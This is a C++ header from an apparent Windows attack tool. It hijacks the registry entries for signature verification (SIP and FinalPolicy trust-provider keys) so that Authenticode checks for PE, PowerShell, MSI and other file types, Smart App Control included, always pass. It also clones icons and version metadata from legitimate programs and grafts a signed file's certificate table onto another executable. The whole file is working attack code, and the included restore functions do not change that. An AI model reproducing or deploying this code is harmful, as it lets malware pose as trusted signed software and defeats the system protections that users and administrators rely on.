#pragma once

#include <windows.h>
#include <cstddef>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <cwctype>
#include <fstream>
#include <iostream>
#include <string>
#include <sstream>
#include <vector>

// Global verbose flag
bool g_verbose = false;

// NOTE: the original header declared its own WIN_CERTIFICATE here. This project
// includes <wintrust.h> through pe_signature.h, so the Windows SDK type is used and
// the duplicate declaration is intentionally removed.


bool SetRegistryValues(HKEY rootKey, LPCWSTR subkey, LPCWSTR dllPath, LPCWSTR funcName, REGSAM accessFlag) {
    if (g_verbose) std::wcout << L"[*] Opening key: " << subkey << std::endl;
    HKEY hKey;
    LONG result = RegCreateKeyExW(rootKey, subkey, 0, nullptr, 0, KEY_SET_VALUE | accessFlag, nullptr, &hKey, nullptr);
    if (result != ERROR_SUCCESS) {
        if (g_verbose) {
            std::wcerr << L"[-] Failed to open key: " << subkey << L" (Error " << result << L")" << std::endl;
        }
        return false;
    }

    if (g_verbose) std::wcout << L"[*] Setting Dll to: " << dllPath << std::endl;
    result = RegSetValueExW(hKey, L"Dll", 0, REG_SZ, reinterpret_cast<const BYTE*>(dllPath), (DWORD)((wcslen(dllPath) + 1) * sizeof(wchar_t)));
    if (result != ERROR_SUCCESS) {
        if (g_verbose) {
            std::wcerr << L"[-] Failed to set 'Dll' value. Error: " << result << std::endl;
        }
        RegCloseKey(hKey);
        return false;
    }

    if (g_verbose) std::wcout << L"[*] Setting FuncName to: " << funcName << std::endl;
    result = RegSetValueExW(hKey, L"FuncName", 0, REG_SZ, reinterpret_cast<const BYTE*>(funcName), (DWORD)((wcslen(funcName) + 1) * sizeof(wchar_t)));
    if (result != ERROR_SUCCESS) {
        if (g_verbose) {
            std::wcerr << L"[-] Failed to set 'FuncName' value. Error: " << result << std::endl;
        }
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);
    if (g_verbose) std::wcout << L"[+] Successfully updated registry key." << std::endl;
    return true;
}

// Trust Provider keys use $DLL and $Function (not Dll/FuncName)
bool SetTrustProviderValues(HKEY rootKey, LPCWSTR subkey, LPCWSTR dllPath, LPCWSTR funcName, REGSAM accessFlag) {
    HKEY hKey;
    LONG result = RegCreateKeyExW(rootKey, subkey, 0, nullptr, 0, KEY_SET_VALUE | accessFlag, nullptr, &hKey, nullptr);
    if (result != ERROR_SUCCESS) {
        if (g_verbose) {
            std::wcerr << L"[-] Failed to open key: " << subkey << L" (Error " << result << L")" << std::endl;
        }
        return false;
    }
    result = RegSetValueExW(hKey, L"$DLL", 0, REG_SZ, reinterpret_cast<const BYTE*>(dllPath), (DWORD)((wcslen(dllPath) + 1) * sizeof(wchar_t)));
    if (result != ERROR_SUCCESS) { RegCloseKey(hKey); return false; }
    result = RegSetValueExW(hKey, L"$Function", 0, REG_SZ, reinterpret_cast<const BYTE*>(funcName), (DWORD)((wcslen(funcName) + 1) * sizeof(wchar_t)));
    if (result != ERROR_SUCCESS) { RegCloseKey(hKey); return false; }
    RegCloseKey(hKey);
    return true;
}

std::wstring normalize_provider_guid(const std::wstring& guid) {
    std::wstring normalized = guid;
    if (normalized.empty()) return normalized;
    if (normalized.front() != L'{') normalized.insert(normalized.begin(), L'{');
    if (normalized.back() != L'}') normalized.push_back(L'}');
    return normalized;
}

bool bypass_finalpolicy() {
    if (g_verbose) std::cout << "[*] Bypassing FinalPolicy (SoftpubCleanup)..." << std::endl;
    const std::wstring subkey = L"SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}";
    const bool ok64 = SetTrustProviderValues(HKEY_LOCAL_MACHINE, subkey.c_str(),
                                             L"C:\\Windows\\System32\\WINTRUST.DLL",
                                             L"SoftpubCleanup", KEY_WOW64_64KEY);
    const bool ok32 = SetTrustProviderValues(HKEY_LOCAL_MACHINE, subkey.c_str(),
                                             L"C:\\Windows\\System32\\WINTRUST.DLL",
                                             L"SoftpubCleanup", KEY_WOW64_32KEY);
    return ok64 && ok32;
}

bool cleanup_finalpolicy() {
    if (g_verbose) std::cout << "[*] Restoring FinalPolicy (SoftpubAuthenticode)..." << std::endl;
    const std::wstring subkey = L"SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}";
    const bool ok64 = SetTrustProviderValues(HKEY_LOCAL_MACHINE, subkey.c_str(),
                                             L"WINTRUST.DLL",
                                             L"SoftpubAuthenticode", KEY_WOW64_64KEY);
    const bool ok32 = SetTrustProviderValues(HKEY_LOCAL_MACHINE, subkey.c_str(),
                                             L"WINTRUST.DLL",
                                             L"SoftpubAuthenticode", KEY_WOW64_32KEY);
    return ok64 && ok32;
}

bool bypass_custom_provider(const std::wstring& guid) {
    if (g_verbose) std::cout << "[*] Registering custom trust provider..." << std::endl;
    const std::wstring subkey = L"SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\" +
                                normalize_provider_guid(guid);
    const bool ok64 = SetTrustProviderValues(HKEY_LOCAL_MACHINE, subkey.c_str(),
                                             L"C:\\Windows\\System32\\WINTRUST.DLL",
                                             L"SoftpubCleanup", KEY_WOW64_64KEY);
    const bool ok32 = SetTrustProviderValues(HKEY_LOCAL_MACHINE, subkey.c_str(),
                                             L"C:\\Windows\\System32\\WINTRUST.DLL",
                                             L"SoftpubCleanup", KEY_WOW64_32KEY);
    return ok64 && ok32;
}

bool cleanup_custom_provider(const std::wstring& guid) {
    const std::wstring normalized = normalize_provider_guid(guid);
    const std::wstring base = L"SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy";
    const std::wstring subkey = base + L"\\" + normalized;
    if (g_verbose) std::wcout << L"[*] Removing custom trust provider: " << subkey << std::endl;

    bool success = true;

    LONG result = RegDeleteTreeW(HKEY_LOCAL_MACHINE, subkey.c_str());
    if (result != ERROR_SUCCESS &&
        result != ERROR_FILE_NOT_FOUND &&
        result != ERROR_PATH_NOT_FOUND) {
        success = false;
    }

    HKEY parent = nullptr;
    const LONG openResult = RegOpenKeyExW(HKEY_LOCAL_MACHINE, base.c_str(), 0,
                                          KEY_READ | KEY_WRITE | KEY_WOW64_32KEY,
                                          &parent);
    if (openResult == ERROR_SUCCESS) {
        result = RegDeleteTreeW(parent, normalized.c_str());
        if (result != ERROR_SUCCESS &&
            result != ERROR_FILE_NOT_FOUND &&
            result != ERROR_PATH_NOT_FOUND) {
            success = false;
        }
        RegCloseKey(parent);
    } else if (openResult != ERROR_FILE_NOT_FOUND &&
               openResult != ERROR_PATH_NOT_FOUND) {
        success = false;
    }

    if (!success) {
        std::wcerr << L"[-] Failed to delete one or both provider views: " << subkey << std::endl;
    }
    return success;
}

// SIP entry: name, GUID, and the default verifier values used by Clean.
struct SipEntry {
    const wchar_t* name;
    const wchar_t* guid;
    const wchar_t* defaultModule;
    const wchar_t* defaultFunc;
};

// 17 standard SIPs. The default values mirror the live Windows 11 registry so
// Clean restores the correct per-type provider instead of forcing every type
// through WINTRUST's PE verifier.
static const SipEntry ALL_STANDARD_SIPS[] = {
    {L"PE",          L"{C689AAB8-8E78-11D0-8C47-00C04FC295EE}", L"WINTRUST.DLL", L"CryptSIPVerifyIndirectData"},
    {L"Java",        L"{C689AAB9-8E78-11D0-8C47-00C04FC295EE}", L"WINTRUST.DLL", L"CryptSIPVerifyIndirectData"},
    {L"CAB",         L"{C689AABA-8E78-11D0-8C47-00C04FC295EE}", L"WINTRUST.DLL", L"CryptSIPVerifyIndirectData"},
    {L"MSI",         L"{000C10F1-0000-0000-C000-000000000046}", L"MSISIP.DLL", L"MsiSIPVerifyIndirectData"},
    {L"PowerShell",  L"{603BCC1F-4B59-4E08-B724-D2C6297EF351}", L"pwrshsip.dll", L"PsVerifyHash"},
    {L"JScript",     L"{06C9E010-38CE-11D4-A2A3-00104BD35090}", L"wshext.dll", L"VerifyIndirectData"},
    {L"VBScript",    L"{1629F04E-2799-4DB5-8FE5-ACE10F17EBAB}", L"wshext.dll", L"VerifyIndirectData"},
    {L"WSF",         L"{1A610570-38CE-11D4-A2A3-00104BD35090}", L"wshext.dll", L"VerifyIndirectData"},
    {L"AppX",        L"{0AC5DF4B-CE07-4DE2-B76E-23C839A09FD1}", L"AppxSip.dll", L"AppxSipVerifyIndirectData"},
    {L"AppXBundle",  L"{0F5F58B3-AADE-4B9A-A434-95742D92ECEB}", L"AppxSip.dll", L"AppxBundleSipVerifyIndirectData"},
    {L"EAppX",       L"{CF78C6DE-64A2-4799-B506-89ADFF5D16D6}", L"AppxSip.dll", L"EappxSipVerifyIndirectData"},
    {L"EAppXBundle", L"{D1D04F0C-9ABA-430D-B0E4-D7E96ACCE66C}", L"AppxSip.dll", L"EappxBundleSipVerifyIndirectData"},
    {L"P7X",         L"{5598CFF1-68DB-4340-B57F-1CACF88C9A51}", L"AppxSip.dll", L"P7xSipVerifyIndirectData"},
    {L"CTL",         L"{9BA61D3F-E73A-11D0-8CD2-00C04FC295EE}", L"WINTRUST.DLL", L"CryptSIPVerifyIndirectData"},
    {L"Flat",        L"{DE351A42-8E59-11D0-8C47-00C04FC295EE}", L"WINTRUST.DLL", L"CryptSIPVerifyIndirectData"},
    {L"Catalog",     L"{DE351A43-8E59-11D0-8C47-00C04FC295EE}", L"WINTRUST.DLL", L"CryptSIPVerifyIndirectData"},
    {L"ESD",         L"{9F3053C5-439D-4BF7-8A77-04F0450A1D9F}", L"EsdSip.dll", L"EsdSipVerifyHash"},
};
static const int NUM_STANDARD_SIPS = sizeof(ALL_STANDARD_SIPS) / sizeof(ALL_STANDARD_SIPS[0]);

// Default 3 SIPs (PE, PowerShell, MSI)
static const wchar_t* DEFAULT_SIP_NAMES[] = {L"PE", L"PowerShell", L"MSI"};
static const int NUM_DEFAULT_SIPS = 3;

// Smart App Control (Win11 only)
static const SipEntry SAC_SIP = {L"SmartAppControl", L"{18B3C141-AE0D-40F9-9465-E542AFC1ABC7}", L"WINTRUST.DLL", L"CryptSIPVerifyIndirectData"};

// Win11-only AppX extensions
// Note: the upstream source used a stale GUID ending in B636-4E9A-847A-AA8E0E540E93.
// The live Windows 11 key is the one below.
static const SipEntry WIN11_SIP = {L"AppXExtensions", L"{1AD2DCB4-1FC8-42EF-8D9B-1EDFB2F7C75D}", L"AppxSip.dll", L"ExtensionsSipVerifyIndirectData"};

// The upstream source used this stale AppX Extensions GUID. It is kept only so
// Clean can remove keys created by older builds of the original tool.
static const SipEntry LEGACY_WIN11_SIP = {L"AppXExtensionsLegacy", L"{1AD2DCB4-B636-4E9A-847A-AA8E0E540E93}", L"AppxSip.dll", L"ExtensionsSipVerifyIndirectData"};

// Build a filtered SIP list from a comma-separated type string
std::vector<SipEntry> resolve_sip_types(const std::string& sip_types, bool include_sac, bool all_sips) {
    std::vector<SipEntry> result;

    if (all_sips) {
        for (int i = 0; i < NUM_STANDARD_SIPS; i++) result.push_back(ALL_STANDARD_SIPS[i]);
        result.push_back(SAC_SIP);
        result.push_back(WIN11_SIP);
        return result;
    }

    if (sip_types.empty()) {
        // Default: PE, PowerShell, MSI
        for (int d = 0; d < NUM_DEFAULT_SIPS; d++) {
            for (int i = 0; i < NUM_STANDARD_SIPS; i++) {
                if (_wcsicmp(ALL_STANDARD_SIPS[i].name, DEFAULT_SIP_NAMES[d]) == 0) {
                    result.push_back(ALL_STANDARD_SIPS[i]);
                    break;
                }
            }
        }
    } else if (_stricmp(sip_types.c_str(), "all") == 0) {
        for (int i = 0; i < NUM_STANDARD_SIPS; i++) result.push_back(ALL_STANDARD_SIPS[i]);
    } else {
        // Parse comma-separated names
        std::string token;
        std::istringstream stream(sip_types);
        while (std::getline(stream, token, ',')) {
            // Trim whitespace
            while (!token.empty() && token[0] == ' ') token.erase(0, 1);
            while (!token.empty() && token.back() == ' ') token.pop_back();
            if (token.empty()) continue;
            std::wstring wtoken(token.begin(), token.end());
            bool found = false;
            for (int i = 0; i < NUM_STANDARD_SIPS; i++) {
                if (_wcsicmp(ALL_STANDARD_SIPS[i].name, wtoken.c_str()) == 0) {
                    result.push_back(ALL_STANDARD_SIPS[i]);
                    found = true;
                    break;
                }
            }
            if (!found && _wcsicmp(wtoken.c_str(), L"SmartAppControl") == 0) {
                result.push_back(SAC_SIP);
                found = true;
            }
            if (!found && _wcsicmp(wtoken.c_str(), L"AppXExtensions") == 0) {
                result.push_back(WIN11_SIP);
                found = true;
            }
            if (!found) {
                std::fprintf(stderr, "[-] Unknown SIP type: %s\n", token.c_str());
                std::fprintf(stderr, "    Available: PE,Java,CAB,MSI,PowerShell,JScript,VBScript,WSF,AppX,AppXBundle,EAppX,EAppXBundle,P7X,CTL,Flat,Catalog,ESD,SmartAppControl,AppXExtensions\n");
                result.clear();
                return result;
            }
        }
    }

    if (include_sac) {
        bool has_sac = false;
        for (auto& s : result) if (wcscmp(s.guid, SAC_SIP.guid) == 0) { has_sac = true; break; }
        if (!has_sac) result.push_back(SAC_SIP);
    }

    return result;
}

bool apply_sip_bypass(const std::vector<SipEntry>& sips, LPCWSTR dllPath, LPCWSTR funcName, bool wow64_only) {
    bool success = true;
    for (const auto& sip : sips) {
        // Use the same logical path for both registry views. Passing
        // KEY_WOW64_32KEY makes Windows map it to SOFTWARE\WOW6432Node.
        // The upstream header also embedded WOW6432Node in the path, which
        // produced a useless WOW6432Node\WOW6432Node key for 32-bit callers.
        std::wstring subkey = L"SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\";
        subkey += sip.guid;

        if (!wow64_only) {
            if (!SetRegistryValues(HKEY_LOCAL_MACHINE, subkey.c_str(), dllPath, funcName, KEY_WOW64_64KEY))
                success = false;
        }
        if (!SetRegistryValues(HKEY_LOCAL_MACHINE, subkey.c_str(), dllPath, funcName, KEY_WOW64_32KEY))
            success = false;
    }
    return success;
}

bool install_sip_bypass(const std::vector<SipEntry>& sips, bool wow64_only = false)
{
    if (g_verbose) std::cout << "[*] Bypassing Registry SIP Provider..." << std::endl;
    return apply_sip_bypass(sips, L"C:\\Windows\\System32\\ntdll.dll", L"DbgUiContinue", wow64_only);
}

bool ReadRegistryStringValue(HKEY rootKey, const std::wstring& subkey,
                             const wchar_t* valueName, REGSAM accessFlag,
                             std::wstring& value) {
    HKEY key = nullptr;
    if (RegOpenKeyExW(rootKey, subkey.c_str(), 0, KEY_READ | accessFlag, &key) !=
        ERROR_SUCCESS) {
        return false;
    }

    wchar_t buffer[512] = {};
    DWORD size = sizeof(buffer);
    DWORD type = 0;
    const LONG result = RegQueryValueExW(key, valueName, nullptr, &type,
                                         reinterpret_cast<BYTE*>(buffer), &size);
    RegCloseKey(key);

    if (result != ERROR_SUCCESS || (type != REG_SZ && type != REG_EXPAND_SZ)) {
        return false;
    }
    value = buffer;
    return true;
}

bool cleanup_registry(const std::vector<SipEntry>& sips)
{
    if (g_verbose) std::cout << "[*] Restoring Registry SIP Provider to defaults..." << std::endl;

    bool success = true;
    for (const auto& sip : sips) {
        if (!sip.defaultModule || !sip.defaultFunc) continue;

        std::wstring subkey =
            L"SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\";
        subkey += sip.guid;

        // WINTRUST.DLL is registered without a path. Other providers use the
        // architecture-specific system directory, matching the live defaults.
        const bool isWintrust = _wcsicmp(sip.defaultModule, L"WINTRUST.DLL") == 0;
        const std::wstring dll64 = isWintrust
            ? std::wstring(sip.defaultModule)
            : L"C:\\Windows\\System32\\" + std::wstring(sip.defaultModule);
        const std::wstring dll32 = isWintrust
            ? std::wstring(sip.defaultModule)
            : L"C:\\Windows\\SysWOW64\\" + std::wstring(sip.defaultModule);

        // Only restore keys this tool actually bypassed. Untouched keys are
        // skipped, which also covers keys Windows protects from Administrator
        // writes (for example the ESD SIP key on Windows 10).
        std::wstring currentDll64, currentDll32;
        ReadRegistryStringValue(HKEY_LOCAL_MACHINE, subkey, L"Dll", KEY_WOW64_64KEY, currentDll64);
        ReadRegistryStringValue(HKEY_LOCAL_MACHINE, subkey, L"Dll", KEY_WOW64_32KEY, currentDll32);

        auto bypassed = [](const std::wstring& dll) {
            if (dll.empty()) return false;
            std::wstring lower = dll;
            for (wchar_t& character : lower) {
                character = static_cast<wchar_t>(towlower(character));
            }
            return lower.find(L"ntdll") != std::wstring::npos;
        };

        if (!bypassed(currentDll64) && !bypassed(currentDll32)) continue;

        if (!SetRegistryValues(HKEY_LOCAL_MACHINE, subkey.c_str(),
                               dll64.c_str(), sip.defaultFunc, KEY_WOW64_64KEY)) {
            success = false;
        }
        if (!SetRegistryValues(HKEY_LOCAL_MACHINE, subkey.c_str(),
                               dll32.c_str(), sip.defaultFunc, KEY_WOW64_32KEY)) {
            success = false;
        }
    }
    return success;
}

// Remove registry debris left by the upstream implementation:
//   - WOW6432Node\WOW6432Node keys from the buggy 32-bit path,
//   - the stale 64-bit AppX Extensions GUID.
bool cleanup_legacy_sip_keys(const std::vector<SipEntry>& sips)
{
    bool success = true;
    std::vector<SipEntry> legacy = sips;
    legacy.push_back(LEGACY_WIN11_SIP);

    for (const auto& sip : legacy) {
        std::wstring subkey = L"SOFTWARE\\WOW6432Node\\WOW6432Node\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\";
        subkey += sip.guid;
        const LONG result = RegDeleteTreeW(HKEY_LOCAL_MACHINE, subkey.c_str());
        if (result != ERROR_SUCCESS &&
            result != ERROR_FILE_NOT_FOUND &&
            result != ERROR_PATH_NOT_FOUND) {
            success = false;
        }
    }

    // The stale AppX Extensions GUID was also written to the normal 64-bit
    // view by the upstream source.
    const std::wstring stale64 =
        L"SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\"
        L"{1AD2DCB4-B636-4E9A-847A-AA8E0E540E93}";
    LONG result = RegDeleteTreeW(HKEY_LOCAL_MACHINE, stale64.c_str());
    if (result != ERROR_SUCCESS &&
        result != ERROR_FILE_NOT_FOUND &&
        result != ERROR_PATH_NOT_FOUND) {
        success = false;
    }

    // Also remove the stale GUID from the correct 32-bit view, in case a
    // patched build wrote it there.
    HKEY parent = nullptr;
    const std::wstring base =
        L"SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData";
    const LONG openResult = RegOpenKeyExW(HKEY_LOCAL_MACHINE, base.c_str(), 0,
                                          KEY_READ | KEY_WRITE | KEY_WOW64_32KEY,
                                          &parent);
    if (openResult == ERROR_SUCCESS) {
        result = RegDeleteTreeW(parent, L"{1AD2DCB4-B636-4E9A-847A-AA8E0E540E93}");
        if (result != ERROR_SUCCESS &&
            result != ERROR_FILE_NOT_FOUND &&
            result != ERROR_PATH_NOT_FOUND) {
            success = false;
        }
        RegCloseKey(parent);
    } else if (openResult != ERROR_FILE_NOT_FOUND &&
               openResult != ERROR_PATH_NOT_FOUND) {
        success = false;
    }

    return success;
}

// --- Metadata Cloning ---

// Helper to copy a single resource
bool CopyResource(HMODULE hSrc, HANDLE hUpdate, LPCWSTR type, LPCWSTR name, WORD lang) {
    HRSRC hRes = FindResourceExW(hSrc, type, name, lang);
    if (!hRes) return false;
    
    HGLOBAL hData = LoadResource(hSrc, hRes);
    if (!hData) return false;
    
    void* pData = LockResource(hData);
    DWORD dwSize = SizeofResource(hSrc, hRes);
    
    if (!pData || dwSize == 0) return false;
    
    if (!UpdateResourceW(hUpdate, type, name, lang, pData, dwSize)) {
        if (g_verbose) std::cerr << "[-] UpdateResource failed for type " << (uintptr_t)type << std::endl;
        return false;
    }
    return true;
}

struct EnumContext {
    HMODULE hSrc;
    HANDLE hUpdate;
};

BOOL CALLBACK EnumResLangProc(HMODULE hModule, LPCWSTR lpszType, LPCWSTR lpszName, WORD wIDLanguage, LONG_PTR lParam) {
    (void)hModule;
    EnumContext* ctx = (EnumContext*)lParam;
    CopyResource(ctx->hSrc, ctx->hUpdate, lpszType, lpszName, wIDLanguage);
    return TRUE;
}

BOOL CALLBACK EnumResNameProc(HMODULE hModule, LPCWSTR lpszType, LPWSTR lpszName, LONG_PTR lParam) {
    // For each name, enumerate languages
    EnumResourceLanguagesW(hModule, lpszType, lpszName, EnumResLangProc, lParam);
    return TRUE;
}

bool clone_metadata(const std::string& src_path, const std::string& dst_path) {
    if (g_verbose) std::cout << "[*] Cloning metadata (Version Info & Icons)..." << std::endl;

    // Load source as data file
    HMODULE hSrc = LoadLibraryExA(src_path.c_str(), NULL, LOAD_LIBRARY_AS_DATAFILE);
    if (!hSrc) {
        std::cerr << "[-] Failed to load source binary resources (LoadLibraryEx)." << std::endl;
        return false;
    }

    // Open destination for update
    HANDLE hUpdate = BeginUpdateResourceA(dst_path.c_str(), FALSE); // FALSE = merge with existing
    if (!hUpdate) {
        std::cerr << "[-] Failed to open destination binary for resource update." << std::endl;
        FreeLibrary(hSrc);
        return false;
    }

    EnumContext ctx;
    ctx.hSrc = hSrc;
    ctx.hUpdate = hUpdate;

    // 1. Copy Version Info (RT_VERSION)
    if (g_verbose) std::cout << "[*] Copying RT_VERSION..." << std::endl;
    EnumResourceNamesW(hSrc, (LPCWSTR)RT_VERSION, EnumResNameProc, (LONG_PTR)&ctx);

    // 2. Copy Icon Groups (RT_GROUP_ICON)
    if (g_verbose) std::cout << "[*] Copying RT_GROUP_ICON..." << std::endl;
    EnumResourceNamesW(hSrc, (LPCWSTR)RT_GROUP_ICON, EnumResNameProc, (LONG_PTR)&ctx);

    // 3. Copy Icons (RT_ICON)
    if (g_verbose) std::cout << "[*] Copying RT_ICON..." << std::endl;
    EnumResourceNamesW(hSrc, (LPCWSTR)RT_ICON, EnumResNameProc, (LONG_PTR)&ctx);
    
    // 4. Copy Manifest (RT_MANIFEST) - Optional but good for "trust" appearance
    if (g_verbose) std::cout << "[*] Copying RT_MANIFEST..." << std::endl;
    EnumResourceNamesW(hSrc, (LPCWSTR)RT_MANIFEST, EnumResNameProc, (LONG_PTR)&ctx);

    // Commit changes
    if (!EndUpdateResourceA(hUpdate, FALSE)) { // FALSE = write changes
        std::cerr << "[-] Failed to commit resource changes." << std::endl;
        FreeLibrary(hSrc);
        return false;
    }

    FreeLibrary(hSrc);
    if (g_verbose) std::cout << "[+] Metadata cloned successfully." << std::endl;
    return true;
}

static inline uint64_t align8(uint64_t x) {
    return (x + 7) & ~7ULL;
}

bool append_certificate_table(const std::string& src_path, const std::string& dst_path) {
    if (g_verbose) std::cout << "[*] Reading source file: " << src_path << std::endl;
    
    // 1) Open source and read headers
    std::ifstream src(src_path, std::ios::binary);
    if (!src) {
        if (g_verbose) std::cerr << "[-] Failed to open source file." << std::endl;
        return false;
    }

    IMAGE_DOS_HEADER dos;
    src.read(reinterpret_cast<char*>(&dos), sizeof(dos));
    if (dos.e_magic != 0x5A4D) return false;  // not MZ

    src.seekg(dos.e_lfanew, std::ios::beg);
    
    // Read Signature + File Header
    uint32_t signature;
    src.read(reinterpret_cast<char*>(&signature), sizeof(signature));
    if (signature != 0x00004550) return false; // not PE\0\0

    IMAGE_FILE_HEADER fileHeader;
    src.read(reinterpret_cast<char*>(&fileHeader), sizeof(fileHeader));

    // Read Optional Header Magic to determine 32/64 bit
    uint16_t magic;
    src.read(reinterpret_cast<char*>(&magic), sizeof(magic));
    
    // Rewind to start of Optional Header
    src.seekg(-2, std::ios::cur);

    IMAGE_DATA_DIRECTORY certDir = {0};

    if (magic == 0x10b) { // PE32
        IMAGE_OPTIONAL_HEADER32 opt32;
        src.read(reinterpret_cast<char*>(&opt32), sizeof(opt32));
        certDir = opt32.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
    } else if (magic == 0x20b) { // PE32+
        IMAGE_OPTIONAL_HEADER64 opt64;
        src.read(reinterpret_cast<char*>(&opt64), sizeof(opt64));
        certDir = opt64.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
    } else {
        if (g_verbose) std::cerr << "[-] Unknown Optional Header Magic: " << std::hex << magic << std::endl;
        return false;
    }

    if (certDir.VirtualAddress == 0 || certDir.Size == 0) {
        if (g_verbose) std::cerr << "[-] No certificate table found in source file." << std::endl;
        return false;
    }
    
    if (g_verbose) std::cout << "[*] Certificate Table found at File Offset: 0x" << std::hex << certDir.VirtualAddress << " Size: " << std::dec << certDir.Size << std::endl;

    // 2) Read the entire certificate table in one blob
    std::vector<char> blob(certDir.Size);
    src.seekg(certDir.VirtualAddress, std::ios::beg);
    src.read(blob.data(), blob.size());
    src.close();

    if (g_verbose) std::cout << "[*] Writing to destination file: " << dst_path << std::endl;

    // 3) Append to dst with 8-byte alignment
    std::fstream dst(dst_path,
        std::ios::binary | std::ios::in | std::ios::out);
    if (!dst) {
        if (g_verbose) std::cerr << "[-] Failed to open destination file." << std::endl;
        return false;
    }

    dst.seekg(0, std::ios::end);
    uint64_t eof = dst.tellg();
    uint64_t writeOff = align8(eof);
    if (writeOff > eof) {
        std::vector<char> pad(writeOff - eof, 0);
        dst.write(pad.data(), (std::streamsize)pad.size());
    }

    dst.write(blob.data(), (std::streamsize)blob.size());

    // 4) Patch DataDirectory[4] in the target PE
    IMAGE_DOS_HEADER dos2;
    dst.seekg(0, std::ios::beg);
    dst.read(reinterpret_cast<char*>(&dos2), sizeof(dos2));

    // compute base of DataDirectory array
    uint32_t ddBase = dos2.e_lfanew
        + 4                                          // Signature
        + sizeof(IMAGE_FILE_HEADER)
        + offsetof(IMAGE_OPTIONAL_HEADER64, DataDirectory);

    // entry #4 (zero-based) is the security directory
    uint32_t dd4 = ddBase + 4 * sizeof(IMAGE_DATA_DIRECTORY);

    // write VirtualAddress (file offset) then Size
    dst.seekp(dd4 + offsetof(IMAGE_DATA_DIRECTORY, VirtualAddress),
        std::ios::beg);
    uint32_t off32 = static_cast<uint32_t>(writeOff);
    dst.write(reinterpret_cast<const char*>(&off32), sizeof(off32));

    uint32_t size32 = certDir.Size;
    dst.write(reinterpret_cast<const char*>(&size32), sizeof(size32));

    dst.close();
    
    if (g_verbose) std::cout << "[+] Signature appended and header updated." << std::endl;
    return true;
}
